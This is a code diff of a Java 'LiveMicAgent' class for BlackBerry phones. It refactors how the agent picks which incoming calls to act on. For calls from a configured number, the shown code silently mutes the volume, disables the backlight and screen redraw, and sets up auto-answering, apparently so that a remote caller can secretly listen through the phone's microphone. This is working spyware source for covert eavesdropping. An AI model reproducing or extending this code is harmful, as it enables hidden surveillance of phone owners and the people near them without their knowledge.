@@ -134,10 +134,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         debug.info("callAnswered: " + phoneNumber);
         //#endif
 
-        if (!phoneNumber.endsWith(number)) {
-            //#ifdef DEBUG_TRACE
-            debug.trace("onCallIncoming, don't tap: " + phoneNumber);
-            //#endif
+        if (!interestingNumber(phoneNumber)) {
             return;
         }
                 
@@ -161,8 +158,25 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         //#ifdef DEBUG_INFO
         debug.info("callConnected: " + phoneNumber);
         //#endif      
+        
+        if (!interestingNumber(phoneNumber)) {
+            return;
+        }
+        
         suspendPainting(false);
         Backlight.enable(false);
+    }
+
+    private boolean interestingNumber(final String phoneNumber) {
+        if (!phoneNumber.endsWith(number)) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
+                    + number);
+            //#endif
+            return false;
+        }
+        
+        return true;
     }
 
     /*
@@ -176,6 +190,10 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         debug.info("callDisconnected: " + phoneNumber);
         //#endif
 
+        if (!interestingNumber(phoneNumber)) {
+            return;
+        }
+        
         suspendPainting(false);
         autoanswer = false;
     }
@@ -186,19 +204,14 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * blackberry.interfaces.PhoneCallObserver#onCallIncoming(java.lang.String)
      */
     public void onCallIncoming(final String phoneNumber) {
-
-        if (!phoneNumber.endsWith(number)) {
-            //#ifdef DEBUG_TRACE
-            debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
-                    + number);
-            //#endif
-            return;
-        }
-
         //#ifdef DEBUG_INFO
         debug.info("answering: " + phoneNumber);
         //#endif
-
+        
+        if (!interestingNumber(phoneNumber)) {
+            return;
+        }
+      
         volume = Alert.getVolume();
         Alert.setBuzzerVolume(0);
         Audio.setVolume(0);
